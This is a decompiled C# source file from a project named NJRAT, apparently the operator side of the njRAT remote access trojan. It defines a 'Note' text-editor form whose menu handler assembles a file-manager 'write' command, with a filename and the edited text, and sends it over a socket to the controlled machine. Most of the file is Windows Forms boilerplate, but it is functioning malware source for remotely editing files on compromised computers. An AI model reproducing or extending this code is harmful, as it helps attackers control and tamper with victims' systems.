using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x0200001C RID: 28
	[DesignerGenerated]
	public partial class Note : Form
	{
		// Token: 0x0600042A RID: 1066 RVA: 0x0016BA34 File Offset: 0x00169E34
		[DebuggerNonUserCode]
		public Note()
		{
			Note.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x0600042B RID: 1067 RVA: 0x0016BA4C File Offset: 0x00169E4C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Note.__ENCList;
			lock (_ENCList)
			{
				bool flag = Note.__ENCList.Count == Note.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Note.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Note.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Note.__ENCList[num] = Note.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Note.__ENCList.RemoveRange(num, Note.__ENCList.Count - num);
					Note.__ENCList.Capacity = Note.__ENCList.Count;
				}
				Note.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000185 RID: 389
		// (get) Token: 0x0600042E RID: 1070 RVA: 0x0016BE80 File Offset: 0x0016A280
		// (set) Token: 0x0600042F RID: 1071 RVA: 0x0016BE98 File Offset: 0x0016A298
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		// Token: 0x17000186 RID: 390
		// (get) Token: 0x06000430 RID: 1072 RVA: 0x0016BEA4 File Offset: 0x0016A2A4
		// (set) Token: 0x06000431 RID: 1073 RVA: 0x0016BEBC File Offset: 0x0016A2BC
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= eventHandler;
				}
				this._ToolStripMenuItem1 = value;
				flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000187 RID: 391
		// (get) Token: 0x06000432 RID: 1074 RVA: 0x0016BF1C File Offset: 0x0016A31C
		// (set) Token: 0x06000433 RID: 1075 RVA: 0x0016BF34 File Offset: 0x0016A334
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.TextBox1_TextChanged);
				bool flag = this._TextBox1 != null;
				if (flag)
				{
					this._TextBox1.TextChanged -= eventHandler;
				}
				this._TextBox1 = value;
				flag = this._TextBox1 != null;
				if (flag)
				{
					this._TextBox1.TextChanged += eventHandler;
				}
			}
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x0016BF94 File Offset: 0x0016A394
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string[] array = new string[9];
			array[0] = "Ex";
			array[1] = Class7.string_1;
			array[2] = "fm";
			array[3] = Class7.string_1;
			array[4] = "wr";
			array[5] = Class7.string_1;
			array[6] = Class6.smethod_14(ref this.FN);
			array[7] = Class7.string_1;
			TextBox textBox = this.TextBox1;
			string text = textBox.Text;
			textBox.Text = text;
			array[8] = Class6.smethod_14(ref text);
			this.SK.Send(string.Concat(array));
			this.ToolStripMenuItem1.Enabled = false;
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x0016C03C File Offset: 0x0016A43C
		private void TextBox1_TextChanged(object sender, EventArgs e)
		{
			this.ToolStripMenuItem1.Enabled = true;
		}

		// Token: 0x040001EB RID: 491
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040001ED RID: 493
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x040001EE RID: 494
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x040001EF RID: 495
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x040001F0 RID: 496
		public string FN;

		// Token: 0x040001F1 RID: 497
		public Client SK;
	}
}
